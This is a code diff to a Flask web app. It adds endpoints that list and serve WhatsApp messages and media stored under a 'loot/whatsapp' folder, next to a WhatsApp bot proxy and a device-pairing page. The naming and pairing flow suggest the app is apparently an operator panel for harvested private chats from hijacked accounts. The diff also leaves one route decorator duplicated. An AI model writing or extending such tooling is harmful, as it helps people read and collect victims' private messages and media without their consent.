@@ -545,6 +545,46 @@ def _wa_proxy(path, method="GET", body=None):
         return 502, json.dumps({"ok": False, "error": "whatsapp bot offline"}).encode(), "application/json"
 
 
+@app.route("/api/whatsapp/messages")
+def api_wa_messages():
+    base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot", "whatsapp")
+    msgs = []
+    if os.path.isdir(base):
+        for d in sorted(os.listdir(base)):
+            dp = os.path.join(base, d)
+            if not os.path.isdir(dp):
+                continue
+            try:
+                files = os.listdir(dp)
+            except Exception:
+                continue
+            media = [f for f in files if f.startswith("media_")]
+            for f in files:
+                if f.startswith("msg_") and f.endswith(".json"):
+                    try:
+                        with open(os.path.join(dp, f), encoding="utf-8") as fh:
+                            m = json.load(fh)
+                        m["dir"] = d
+                        m["media"] = media
+                        msgs.append(m)
+                    except Exception:
+                        pass
+    msgs.sort(key=lambda m: str(m.get("ts", "")), reverse=True)
+    return jsonify(msgs[:500])
+
+
+@app.route("/api/whatsapp/media/<dir_name>/<file_name>")
+def api_wa_media(dir_name, file_name):
+    if not re.fullmatch(r"[0-9A-Za-z_-]{1,80}", dir_name) or not re.fullmatch(r"[0-9A-Za-z_.-]{1,120}", file_name):
+        return jsonify({"ok": False, "error": "invalid path"}), 400
+    base = os.path.realpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot", "whatsapp"))
+    fp = os.path.realpath(os.path.join(base, dir_name, file_name))
+    if not fp.startswith(base + os.sep) or not os.path.isfile(fp):
+        return jsonify({"ok": False, "error": "not found"}), 404
+    return send_from_directory(os.path.join(base, dir_name), file_name)
+
+
+@app.route("/whatsapp-pair")
 @app.route("/whatsapp-pair")
 def wa_pair_page():
     st, data, ct = _wa_proxy("/whatsapp-pair")
